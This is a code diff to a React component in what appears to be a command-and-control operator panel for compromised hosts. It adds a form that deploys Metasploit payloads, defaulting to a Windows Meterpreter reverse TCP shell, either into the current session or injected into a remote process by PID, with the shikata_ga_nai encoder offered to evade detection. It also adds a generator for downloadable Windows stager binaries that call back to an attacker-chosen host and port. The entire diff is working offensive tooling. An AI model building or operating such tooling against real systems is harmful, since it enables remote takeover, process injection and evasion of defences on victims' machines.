@@ -29,6 +29,27 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
   const [reconError, setReconError] = useState('')
   const [reconfiguring, setReconfiguring] = useState(false)
 
+  const [msfMode, setMsfMode] = useState<'msf' | 'msfRemote'>('msf')
+  const [msfPayload, setMsfPayload] = useState('windows/meterpreter/reverse_tcp')
+  const [msfLhost, setMsfLhost] = useState('')
+  const [msfLport, setMsfLport] = useState('4444')
+  const [msfEncoder, setMsfEncoder] = useState('')
+  const [msfIterations, setMsfIterations] = useState('0')
+  const [msfPid, setMsfPid] = useState('')
+  const [msfMsg, setMsfMsg] = useState('')
+  const [msfError, setMsfError] = useState('')
+  const [msfRunning, setMsfRunning] = useState(false)
+
+  const [stageArch, setStageArch] = useState('amd64')
+  const [stageFormat, setStageFormat] = useState('raw')
+  const [stageHost, setStageHost] = useState('')
+  const [stagePort, setStagePort] = useState('443')
+  const [stageProtocol, setStageProtocol] = useState('tcp')
+  const stageOs = 'windows'
+  const [stager, setStager] = useState<{ FileName: string; DataB64: string; Size: number } | null>(null)
+  const [stageError, setStageError] = useState('')
+  const [stageRunning, setStageRunning] = useState(false)
+
   const reconfigure = async () => {
     const seconds = Number(reconSec)
     if (!Number.isFinite(seconds) || seconds <= 0) {
@@ -46,6 +67,67 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
     } finally {
       setReconfiguring(false)
     }
+  }
+
+  const runMsf = async () => {
+    setMsfRunning(true)
+    setMsfError('')
+    setMsfMsg('')
+    try {
+      const opts = {
+        payload: msfPayload.trim(),
+        lhost: msfLhost.trim(),
+        lport: Number(msfLport) || 4444,
+        encoder: msfEncoder.trim() || undefined,
+        iterations: Number(msfIterations) || 0,
+      }
+      if (msfMode === 'msf') {
+        await api.msf(sessionId, opts)
+      } else {
+        await api.msfRemote(sessionId, { ...opts, pid: Number(msfPid) || 0 })
+      }
+      setMsfMsg(t('advanced.msfOk'))
+    } catch (e) {
+      setMsfError((e as Error).message)
+    } finally {
+      setMsfRunning(false)
+    }
+  }
+
+  const generateStage = async () => {
+    setStageRunning(true)
+    setStageError('')
+    setStager(null)
+    try {
+      const s = await api.msfStage({
+        arch: stageArch,
+        format: stageFormat,
+        host: stageHost.trim(),
+        port: Number(stagePort) || 443,
+        os: stageOs,
+        protocol: stageProtocol,
+        bad_chars: [],
+      })
+      setStager(s)
+    } catch (e) {
+      setStageError((e as Error).message)
+    } finally {
+      setStageRunning(false)
+    }
+  }
+
+  const downloadStage = () => {
+    if (!stager) return
+    const data = atob(stager.DataB64)
+    const bytes = new Uint8Array(data.length)
+    for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i)
+    const blob = new Blob([bytes], { type: 'application/octet-stream' })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement('a')
+    a.href = url
+    a.download = stager.FileName
+    a.click()
+    URL.revokeObjectURL(url)
   }
 
   const run = async () => {
@@ -140,6 +222,104 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
           <pre>{output}</pre>
         </div>
       )}
+      </div>
+
+      <div className="card">
+        <div className="card-title">{t('advanced.msfTitle')}</div>
+        <div className="form-grid" style={{ marginBottom: 12 }}>
+          <div className="field">
+            <label>{t('advanced.msfMode')}</label>
+            <select value={msfMode} onChange={(e) => setMsfMode(e.target.value as typeof msfMode)}>
+              <option value="msf">{t('advanced.msfLocal')}</option>
+              <option value="msfRemote">{t('advanced.msfRemote')}</option>
+            </select>
+          </div>
+          <div className="field" style={{ flex: 2 }}>
+            <label>{t('advanced.msfPayload')}</label>
+            <input value={msfPayload} onChange={(e) => setMsfPayload(e.target.value)} />
+          </div>
+          <div className="field">
+            <label>LHOST</label>
+            <input value={msfLhost} onChange={(e) => setMsfLhost(e.target.value)} placeholder="10.10.0.1" />
+          </div>
+          <div className="field">
+            <label>LPORT</label>
+            <input value={msfLport} onChange={(e) => setMsfLport(e.target.value)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.msfEncoder')}</label>
+            <input value={msfEncoder} onChange={(e) => setMsfEncoder(e.target.value)} placeholder="x86/shikata_ga_nai" />
+          </div>
+          <div className="field">
+            <label>{t('advanced.msfIterations')}</label>
+            <input value={msfIterations} onChange={(e) => setMsfIterations(e.target.value)} />
+          </div>
+          {msfMode === 'msfRemote' && (
+            <div className="field">
+              <label>PID</label>
+              <input value={msfPid} onChange={(e) => setMsfPid(e.target.value)} />
+            </div>
+          )}
+          <div className="field" style={{ justifyContent: 'flex-end' }}>
+            <button className="btn primary" onClick={runMsf} disabled={msfRunning || !msfPayload || !msfLhost}>
+              {msfRunning ? t('common.loading') : t('advanced.msfRun')}
+            </button>
+          </div>
+        </div>
+        {msfError && <div className="error-banner">{msfError}</div>}
+        {msfMsg && (
+          <div className="error-banner" style={{ borderColor: 'var(--green)', color: 'var(--green)', background: 'rgba(63,213,143,0.08)' }}>
+            {msfMsg}
+          </div>
+        )}
+      </div>
+
+      <div className="card">
+        <div className="card-title">{t('advanced.stagerTitle')}</div>
+        <div className="form-grid" style={{ marginBottom: 12 }}>
+          <div className="field">
+            <label>{t('advanced.stagerArch')}</label>
+            <select value={stageArch} onChange={(e) => setStageArch(e.target.value)}>
+              <option value="amd64">amd64</option>
+              <option value="386">386</option>
+            </select>
+          </div>
+          <div className="field">
+            <label>{t('advanced.stagerFormat')}</label>
+            <input value={stageFormat} onChange={(e) => setStageFormat(e.target.value)} placeholder="raw" />
+          </div>
+          <div className="field">
+            <label>{t('advanced.stagerProtocol')}</label>
+            <select value={stageProtocol} onChange={(e) => setStageProtocol(e.target.value)}>
+              <option value="tcp">TCP</option>
+              <option value="http">HTTP</option>
+              <option value="https">HTTPS</option>
+            </select>
+          </div>
+          <div className="field" style={{ flex: 2 }}>
+            <label>LHOST</label>
+            <input value={stageHost} onChange={(e) => setStageHost(e.target.value)} placeholder="10.10.0.1" />
+          </div>
+          <div className="field">
+            <label>LPORT</label>
+            <input value={stagePort} onChange={(e) => setStagePort(e.target.value)} />
+          </div>
+          <div className="field" style={{ justifyContent: 'flex-end' }}>
+            <button className="btn primary" onClick={generateStage} disabled={stageRunning || !stageHost}>
+              {stageRunning ? t('common.loading') : t('advanced.stagerGenerate')}
+            </button>
+          </div>
+        </div>
+        {stageError && <div className="error-banner">{stageError}</div>}
+        {stager && (
+          <div className="toolbar">
+            <span className="mono">{stager.FileName}</span>
+            <span className="mono">{stager.Size} bytes</span>
+            <button className="btn sm" onClick={downloadStage}>
+              {t('advanced.stagerDownload')}
+            </button>
+          </div>
+        )}
       </div>
     </>
   )
